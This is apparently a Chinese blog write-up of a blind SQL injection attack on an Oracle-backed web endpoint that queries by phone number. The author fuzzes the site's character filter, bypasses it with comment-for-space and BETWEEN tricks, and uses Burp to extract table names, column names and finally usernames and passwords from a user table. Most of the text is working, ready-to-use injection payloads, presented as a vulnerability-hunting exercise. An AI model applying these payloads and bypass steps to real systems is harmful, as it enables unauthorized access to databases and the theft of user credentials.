关于oracle注射获取数据的实战文章还是比较少的，比较多的都是写写思路或者罗列一些payload就结束了，再比较好一点的也就是绕个WAF获取个库名，真的把数据跑出来的文还是寥寥无几的，也许是因为工作或SRC要求如此吧，但是真的去跑数据的时候还是会遇到各种挑战的，且与君共享一篇oracle注射获取数据的文吧。

##  **0x00 sqlmap梭哈?**

经典盲注  
http://xxx.xxx.xxx/queryByPhone?card=1☎=13111111111'and'1'like'1&companysID=1  
![image.png](https://image.3001.net/images/20230602/1685670426_64794a1af0ae15396e67a.png!small)  
http://xxx.xxx.xxx/queryByPhone?card=1☎=13111111111'and'1'like'2&companysID=1  
![image.png](https://image.3001.net/images/20230602/1685670438_64794a262fd2e36b08129.png!small)  
典型的盲注，判断出注入后，多数情况下会想到sqlmap梭哈，但是结果却是这样的：  
![image.png](https://image.3001.net/images/20230602/1685670448_64794a30cc51084e58cfa.png!small)  
sqlmap也很温馨的提示了，说是可以添加tamper脚本进行尝试，玩了一段时间注入的到这里很容易就想到了可能遇上安全防护了，当然这是后话，我们可以根据sqlmap的提示接着往下走，比如
--tamper=space2comment  
![image.png](https://image.3001.net/images/20230602/1685670458_64794a3ae0651f305918b.png!small)  
有结果了，瞬间对sqlmap又燃起了希望，接着跑库名试试  
![image.png](https://image.3001.net/images/20230602/1685670469_64794a45426fe8ec8d765.png!small)  
未果，继续根据提示进行操作  
![image.png](https://image.3001.net/images/20230602/1685670477_64794a4d8c7252972c342.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670488_64794a583ec165af4062e.png!small)

GG，这次不得行了，到这里单纯靠sqlmap显得不靠谱了，接下来就需要去摸清服务端的过滤规则了。

##  **0x01 Fuzz黑名单注出库名**

通过第一步得知空格被过滤了，输入被过滤的字符，看看服务端的响应：  
![image.png](https://image.3001.net/images/20230602/1685670508_64794a6ca0c376e28001e.png!small)  
服务端给出了友好提示，那我们直接fuzz字符，然后根据服务端响应就可以摸清过滤规则了  
第一种，直接fuzz(%00-%ff)  
![image.png](https://image.3001.net/images/20230602/1685670540_64794a8c2e417b28b2576.png!small)  
第二种，自定义字符字典(记得选中编码，GET请求URI中的特殊字符多数是需要url编码的，否则服务端会返回400)  
![image.png](https://image.3001.net/images/20230602/1685670554_64794a9a8958baa75b3c1.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670566_64794aa656f6216e6dbbd.png!small)  
很明显的看到<和>被过滤了，还有一个比较常用的|字符被干掉了，知道了这两点，其实跑个库名就很简单了，用between
and替代大于小于号就行，继续利用sqlmap的tamper脚本  
![image.png](https://image.3001.net/images/20230602/1685670576_64794ab0949569d9333db.png!small)  
多数情况下挖到这里其实就可以交差结束战斗了，但是毕竟2023年第一个oracle注入，必须跑出数据呀，直接sqlmap  
![image.png](https://image.3001.net/images/20230602/1685670588_64794abc283bc7553bd85.png!small)  
意料之中，因为|被干掉了，sqlmap跑oracle数据的payload中借助了|符号(挂个代理看payload发现的) (sqlmap.py
--purge可以清除历史记录哟)  
![image.png](https://image.3001.net/images/20230602/1685670597_64794ac5cd58d32d6287f.png!small)

##  **0x02 半手工出数据**

根据oracle数据库中固有的字段来跑数据  
user_tables table_name  
user_tab_columns column_name  
通过rownum和not in进行单行数据输出  
比较幸运的是length、substr、逗号都没有被干掉

具体操作如下：

### 1、 获取表的数量

payload：  
`13111111111'and/**/(select/**/count(table_name)/**/from/**/user_tables)=/**/1/**/and'1'like'1`

![image.png](https://image.3001.net/images/20230602/1685670651_64794afb24a385c9cf8a9.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670664_64794b0840b558d802bca.png!small)

### 2、获取表名

先判断第一个表名长度  
payload：  
`13111111111'and/**/(select/**/length(table_name)/**/from/**/user_tables/**/where/**/rownum=1)=/**/1/**/and'1'like'1`  
借助burp判断第一个表名长度：14  
![image.png](https://image.3001.net/images/20230602/1685670717_64794b3d1f512735756de.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670726_64794b465c64a0794d55c.png!small)

获取表名数据  
payload：  
`13111111111'and/**/(select/**/substr(table_name,1,1)/**/from/**/user_tables/**/where/**/rownum=1)=/**/'A'/**/and'1'like'1`  
(oracle数据库的库名、表名、字段都是需要大写的，还有常见的字符如_、$和数字，其中$需要进行url编码哟)  
![image.png](https://image.3001.net/images/20230602/1685670745_64794b59d8ee2eb8c9d5c.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670754_64794b62c75156c9baeac.png!small)

其它字符以此类推，最终注出第一个表名：BA******_NEWS

注出了第一个表名，后续表名借助rownum实现即可  
判断第二个表名长度，只要not in第一个表名即可  
payload：  
`13111111111'and/**/(select/**/length(table_name)/**/from/**/user_tables/**/where/**/rownum=1/**/and/**/table_name/**/not/**/in/**/('BA******_NEWS'))=/**/§1§/**/and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670772_64794b74f0ee3d8f1d054.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670784_64794b80dc9b62dd05b3d.png!small)  
后续字符以此类推，其它表名玩法一样。

### 3、获取列名

先判断第一个列名长度  
payload：  
`13111111111'and/**/(select/**/length(column_name)/**/from/**/user_tab_columns/**/where/**/table_name='BA******_NEWS'/**/and/**/rownum=1)=/**/'§1§'/**/and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670805_64794b9581fb7e4822e63.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670815_64794b9fbe49ef69d599b.png!small)

获取第一个列名字符  
payload：  
`13111111111'and/**/(select/**/substr(column_name,1,1)/**/from/**/user_tab_columns/**/where/**/table_name='BA******_NEWS'/**/and/**/rownum=1)=/**/'§1§'/**/and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670829_64794bad7de2595dbbb86.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670837_64794bb548d8ecd61b3a1.png!small)  
获取其它列名的方法和获取表名一样，借助not in实现  
还是同样的先判断列名长度  
`13111111111'and/**/(select/**/length(column_name)/**/from/**/user_tab_columns/**/where/**/table_name='BA******_NEWS'/**/and/**/rownum=1/**/and/**/column_name/**/not/**/in/**/('ID'))=/**/'§1§'/**/and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670852_64794bc4ee14b7a62ba5d.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670861_64794bcdf1761a6e18f3c.png!small)  
再一一获取列名字符  
`13111111111'and/**/(select/**/substr(column_name,1,1)/**/from/**/user_tab_columns/**/where/**/table_name='BA******_NEWS'/**/and/**/rownum=1/**/and/**/column_name/**/not/**/in/**/('ID'))=/**/'§1§'/**/and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670890_64794bea48075716cffbe.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670900_64794bf44c61a8b1bb945.png!small)  
……  
这里也可以写脚本跑哈，我比较懒，就直接burp操作了一波，跑出一些可能包含敏感数据的表名就停下，然后跑其中的数据就行

### 4、获取敏感数据

经过了一段时间的注入，获取到了一个敏感表名：BA******_USERS，对应的字段：USERNAME，PASSWORD  
接下来就直接获取对应的数据就行了，跑出一两条，证明危害即可哈

先判断第一个用户名长度  
`13111111111'and/**/(select/**/length(USERNAME)/**/from/**/BA******_USERS/**/where/**/rownum=1)='§1§'and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670922_64794c0a5386dcf1732ec.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670930_64794c12edd7af6851e3b.png!small)

跑数据  
`13111111111'and/**/(select/**/substr(USERNAME,§0§,1)/**/from/**/BA******_USERS/**/where/**/rownum=1)='§1§'and'1'like'1`  
![image.png](https://image.3001.net/images/20230602/1685670948_64794c24868f8f79defbd.png!small)  
![image.png](https://image.3001.net/images/20230602/1685670958_64794c2e9ae6b273a684c.png!small)  
按顺序组合即可获取对应数据：ba******admin  
获取PASSWORD字段内容方法同上。

##  **0x03 总结**

犹豫了两天，终于写了这个文，竟然用了两个小时的时间，写的还算比较细了，整个思路和利用过程基本都写到了，就这样吧，以后估计也不会如此细致的写注入的文了，且看且珍惜。

